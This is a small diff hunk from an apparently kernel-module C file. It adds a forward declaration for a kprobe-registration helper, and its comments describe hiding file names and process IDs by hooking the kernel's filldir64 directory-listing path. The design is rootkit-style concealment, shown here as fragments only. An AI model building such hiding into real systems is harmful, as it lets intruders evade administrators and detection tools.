@@ -22,6 +22,11 @@
 
 #define HT_NAME_BUF 12
 
+/* Forward decl: definition lives further down (kprobe struct + register path
+ * are declared after the name-hide helpers). Both name_add and pid_add funnel
+ * through this lazy-arm gate. */
+static int hide_task_register_kprobe_locked(void);
+
 /* File-name hiding (B.1). Each slot holds up to HIDE_NAME_MAX-1 chars and
  * matches on exact directory-entry name equality — cheap to test in the
  * filldir64 pre-handler. Applies to every readdir path in the kernel. */
